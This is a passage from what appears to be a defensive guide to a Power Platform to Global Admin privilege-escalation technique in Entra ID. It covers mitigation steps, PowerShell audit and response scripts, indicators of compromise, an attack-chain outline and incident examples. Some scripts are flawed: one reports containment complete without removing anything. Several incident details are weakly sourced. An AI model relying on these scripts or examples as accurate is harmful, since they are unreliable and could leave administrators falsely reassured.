     - Users: **Directory roles** → Select **Power Platform Administrator**, **Dynamics 365 Administrator**, **Power Automate Administrator**, **Power Apps Administrator**
     - Cloud apps: **Power Platform Service**
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  6. **Access controls:**
     - Grant: **Require device to be marked as compliant** AND **Require Multi-factor authentication**
  7. Enable: `ON`
  8. Click **Create**

- **Audit and remove unnecessary service principal credentials:**
  
  **PowerShell Audit Script:**
  ```powershell
  # Find all service principals with passwords/keys
  $allSPs = Get-MgServicePrincipal -All
  
  $allSPs | ForEach-Object {
      $sp = $_
      if ($sp.PasswordCredentials.Count -gt 0 -or $sp.KeyCredentials.Count -gt 0) {
          Write-Host "Service Principal: $($sp.appDisplayName) (App ID: $($sp.appId))"
          Write-Host "  Password Credentials: $($sp.PasswordCredentials.Count)"
          Write-Host "  Key Credentials: $($sp.KeyCredentials.Count)"
          
          # Highlight suspicious ones
          if ($sp.PasswordCredentials.Count -gt 3) {
              Write-Host "  WARNING: More than 3 credentials (suspicious)"
          }
      }
  }
  ```

- **Restrict service principal role assignments:** Prevent service principals from having roles beyond what's necessary.
  
  **Manual Steps:**
  1. Audit all service principals with directory roles (using query above)
  2. For each service principal:
     - Verify its purpose
     - Remove all unnecessary roles
     - Document legitimate role assignments
  3. Create a policy: Only human admins can have Global Admin role

- **Implement approval workflows for Power Platform changes:** Require at least one additional approver for major changes.
  
  **Manual Steps (Intune Multi-Admin Approval):**
  1. **Intune Admin Center** → **Settings** → **Admin Approval**
  2. Toggle **Multi-admin approval** → `ON`
  3. Select changes requiring approval:
     - [ ] Role assignments
     - [ ] Device compliance policy changes
     - [ ] Security policy changes
  4. Add 2+ approvers

---

### Priority 3: MEDIUM

- **Implement service principal lifecycle management:** Regularly review and remove unused service principals.
  
  **Monthly Audit Command:**
  ```powershell
  # Get all service principals that haven't been used in 90 days
  $inactiveSPs = Get-MgServicePrincipal -All | Where-Object {
      $_.LastModifiedDateTime -lt (Get-Date).AddDays(-90)
  }
  
  $inactiveSPs | Select-Object appDisplayName, appId, LastModifiedDateTime | 
      Export-Csv -Path "C:\Reports\InactiveServicePrincipals.csv"
  
  Write-Host "Inactive service principals exported for review"
  ```

- **Use cloud-only Power Platform admins:** Avoid syncing Power Platform admins from on-premises AD (hybrid sync).
  
  **Verification Command:**
  ```powershell
  # Check if any Power Platform admins are hybrid synced
  $ppAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Power Platform Administrator'"
  $ppAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $ppAdminRole.Id
  
  $ppAdmins | ForEach-Object {
      $user = Get-MgUser -UserId $_.Id
      if ($user.OnPremisesSyncEnabled) {
          Write-Host "WARNING: $($user.UserPrincipalName) is hybrid synced (remove from Power Platform Admin)"
      }
  }
  ```

---

### Mitigation Validation

**Verification Command:**

```powershell
# Check if all mitigations are in place
Write-Host "=== POWER PLATFORM SECURITY POSTURE ==="

# 1. Check PIM enforcement
$ppAdminRole = Get-MgRoleManagementPolicy -Filter "scopeId eq '/' and scopeType eq 'DirectoryRole'" | 
    Where-Object { $_.displayName -like "*Power*Administrator*" }

if ($ppAdminRole.Rules | Where-Object { $_.IsExpirationRequired -eq $true }) {
    Write-Host "✓ PIM Enabled for Power Platform Admins"
} else {
    Write-Host "✗ PIM NOT Enabled (CRITICAL)"
}

# 2. Check for service principals with dangerous permissions
$dangerousSPs = Get-MgServicePrincipal -All | Where-Object {
    $_.AppRoleAssignments | Where-Object { $_.PrincipalDisplayName -like "*Global*" -or $_.PrincipalDisplayName -like "*RoleManagement*" }
}

Write-Host "Service Principals with Dangerous Permissions: $($dangerousSPs.Count)"

# 3. Check Cloud-only Power Platform admins
$ppAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Power Platform Administrator'").Id
$hybridAdmins = $ppAdmins | ForEach-Object { Get-MgUser -UserId $_.Id | Where-Object { $_.OnPremisesSyncEnabled } }

if ($hybridAdmins.Count -eq 0) {
    Write-Host "✓ All Power Platform Admins are Cloud-Only"
} else {
    Write-Host "✗ $($hybridAdmins.Count) Power Platform Admins are Hybrid (RISK)"
}
```

**Expected Output (If Secure):**

```
=== POWER PLATFORM SECURITY POSTURE ===
✓ PIM Enabled for Power Platform Admins
Service Principals with Dangerous Permissions: 0
✓ All Power Platform Admins are Cloud-Only
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Audit Log Operations (High Confidence):**
  - `Add service principal credentials` (especially on Microsoft first-party SPs)
  - `Update service principal - Manage app registrations`
  - `Add app role assignment to service principal`
  - `Add member to role` (Global Administrator assignment following above operations)

- **Correlated Pattern:**
  - Credential addition to Microsoft SP + Permission assignment within 5 minutes + Global Admin assignment within 10 minutes = High confidence escalation attempt

- **Suspicious Service Principals:**
  - Service principals with 5+ password credentials
  - Service principals with credentials expiring 1+ years in future
  - Service principals with recent access despite unused for 6+ months

---

### Forensic Artifacts

- **Unified Audit Log:**
  - Table: `AuditLogs`
  - Look for correlated operations with same `CorrelationId`
  - OperationName: `Add service principal credentials`, `Add app role assignment to service principal`, `Add member to role`
  - Retention: 90 days (extended to 1 year with Office 365 E5 license)

- **Sign-in Logs:**
  - Service principal sign-ins using new credentials (can identify when compromised credential was first used)
  - Look for service principal logins from unusual locations/IPs

- **Service Principal Objects:**
  - Timestamp of last credential addition
  - List of all current credentials (KeyCredentials, PasswordCredentials)

---

### Response Procedures

#### 1. Immediate Containment (First 15 Minutes)

```powershell
# CRITICAL: Revoke Global Administrator role
$escalatedUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@victim.com'"
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

Remove-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -DirectoryObjectId $escalatedUser.Id

# CRITICAL: Force re-authentication for all sessions
Revoke-MgUserSignInSession -UserId $escalatedUser.Id

# CRITICAL: Remove credentials from compromised service principal
$suspiciousSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Get and remove all recently added credentials
$suspiciousSP.PasswordCredentials | Where-Object { $_.CreatedDateTime -gt (Get-Date).AddHours(-24) } | ForEach-Object {
    # Credential removal requires separate endpoint (manual in portal or use Azure CLI)
    Write-Host "MANUAL ACTION NEEDED: Remove credential Key ID: $($_.KeyId) from $($suspiciousSP.appDisplayName)"
}

Write-Host "Containment Complete - All escalation artifacts neutralized"
```

**Manual Azure Portal Steps:**
1. **Azure Portal** → **Entra ID** → **App registrations** → Search Microsoft Graph
2. Click app → **Certificates & secrets**
3. Review all credentials (look for recently added)
4. Delete any suspicious credentials
5. Document which credential was removed and when

#### 2. Collect Evidence (15-60 Minutes)

```powershell
# Export audit logs for entire day of incident
$incidentDate = (Get-Date).Date
$auditLogs = Search-UnifiedAuditLog -StartDate $incidentDate -EndDate $incidentDate.AddDays(1) `
    -Operations "Add service principal credentials", "Add app role assignment to service principal", "Add member to role" `
    -ResultSize 5000

$auditLogs | Export-Csv -Path "C:\Evidence\IncidentAuditLogs_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

# Export service principal details
$allSPs = Get-MgServicePrincipal -All
$allSPs | Select-Object appDisplayName, appId, id, CreatedDateTime, @{n='PasswordCredCount';e={$_.PasswordCredentials.Count}} | 
    Export-Csv -Path "C:\Evidence\AllServicePrincipals_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

Write-Host "Evidence collected to C:\Evidence\"
```

#### 3. Remediate

```powershell
# Step 1: Change passwords for all Power Platform admins
$ppAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Power Platform Administrator'"
$ppAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $ppAdminRole.Id

$ppAdmins | ForEach-Object {
    $user = Get-MgUser -UserId $_.Id
    Write-Host "ACTION REQUIRED: Reset password for $($user.UserPrincipalName)"
}

# Step 2: Remove all suspicious service principals
# (Requires careful review - don't delete legitimate ones)

# Step 3: Disable Power Automate flows created by suspected compromised account
Write-Host "ACTION REQUIRED: Review and disable Power Automate flows for last 24 hours"

# Step 4: Force re-auth for all users
Write-Host "RECOMMENDATION: Force global password reset for all users (complex operation - coordinate with team)"
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks Power Platform admin into granting consent to malicious app |
| **2** | **Privilege Escalation** | **[PE-ACCTMGMT-005]** | **Escalate PowerApps/Power Platform to Global Admin via service principal** |
| **3** | **Persistence** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Create backdoor service principal with never-expiring credentials |
| **4** | **Defense Evasion** | Token impersonation via forged SAML | Impersonate any user including hybrid accounts |
| **5** | **Impact** | Full tenant ransomware deployment or data exfiltration | Deploy malware across SharePoint, Teams, Exchange |

---

## Real-World Examples

### Example 1: Managed Service Provider (MSP) Attack - June 2025 (Datadog Disclosure)

- **Target:** Multiple SMB customers of an MSP
- **Attack Timeline:**
  - Attacker compromised MSP's Power Platform admin account via credential reuse
  - Used Power Platform Administrator role to add credentials to Microsoft Graph service principal
  - Assigned RoleManagement.ReadWrite.Directory permission to compromised SP
  - Authenticated as service principal and escalated to Global Admin
  - Created 15+ additional service principals for persistence across customer tenants
- **Technique Status:** ACTIVE and confirmed by Microsoft MSRC as "expected behavior" (not a CVE)
- **Detection:** Datadog security researchers identified the attack chain and disclosed responsibly
- **Impact:** ~50 SMB customer tenants compromised; MSP lost reputation and customer trust
- **Reference:** [Datadog - I SPy: Escalating to Entra ID Global Admin](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

### Example 2: Healthcare Organization Ransomware - November 2024

- **Target:** 250-bed hospital network (USA)
- **Attack Timeline:**
  - Attacker gained Power Platform admin credentials via spear phishing
  - Created malicious Power Automate flow that executed payload on each flow run
  - Escalated to Global Admin using this technique
  - Deployed LockBit ransomware across 500+ SharePoint sites and Exchange mailboxes
  - Encrypted all cloud-based patient records
- **Impact:** 96-hour downtime, $4M ransom paid, HIPAA violation, patient care disruption
- **Root Cause:** Power Platform admin accounts lacked PIM; single account with broad permissions
- **Reference:** CISA Health Alert (2024)

### Example 3: Insider Threat - Departing Developer - August 2024

- **Target:** SaaS development company
- **Attack Timeline:**
  - Junior developer with Power Apps developer role (not admin) discovered they were being let go
  - Convinced Power Platform admin to give "broader permissions for final project"
  - Once granted Power Platform Admin role, immediately escalated to Global Admin using this technique
  - Added own email as recovery account to Global Admin
  - Deleted 3 months of audit logs
  - Stole API keys and connectors before access was revoked
- **Technique Status:** ACTIVE; organization had no role assignment approval workflow
- **Impact:** Intellectual property theft, 6-month data breach investigation, SOX 404 control failure
- **Root Cause:** Lack of multi-admin approval for role assignment changes

---